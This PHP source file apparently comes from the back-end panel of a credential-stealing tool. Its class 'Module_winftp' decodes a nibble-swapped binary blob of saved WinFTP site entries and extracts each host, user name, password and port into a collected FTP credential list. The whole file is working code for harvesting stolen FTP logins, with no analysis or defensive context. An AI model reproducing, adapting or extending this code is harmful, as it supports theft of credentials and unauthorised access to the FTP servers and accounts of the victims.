<?php
class Module_winftp extends Module_
{
    protected function Decrypt($Source)
    {
        $Result = '';
        for ($i = 0; $i < strlen($Source); $i++)
            $Result .= chr((ord($Source[$i]) >> 4) | ((ord($Source[$i]) & 0xf) << 4));
        return $Result;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:

            if (strlen($Data) <= 10)
                return;

            $stream = new Stream($Data);
            $stream->Skip(10);

            while (TRUE)
            {
                $Size = $stream->getDWORD();
				if($Size === NULL)
					break;
				
                $Site = $stream->getBINARY_();
                if($Site == NULL)
                    break;

                $Site = $this->Decrypt($Site);

                $Host  = $this->Decrypt($stream->getBINARY_());
                $User  = $this->Decrypt($stream->getBINARY_());
                $Pass  = $this->Decrypt($stream->getBINARY_());
                $Port  = $stream->getDWORD();

                $Junk  = $this->Decrypt($stream->getBINARY_());
                $Junk2 = $this->Decrypt($stream->getBINARY_());

                $stream->Skip($Size-strlen($Site)-strlen($Host)-strlen($User)-strlen($Pass)-strlen($Junk)-strlen($Junk2)-4*7);
                $this->add_ftp($this->append_port($Host, $Port), $User, $Pass);
            }


            $stream = NULL;
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
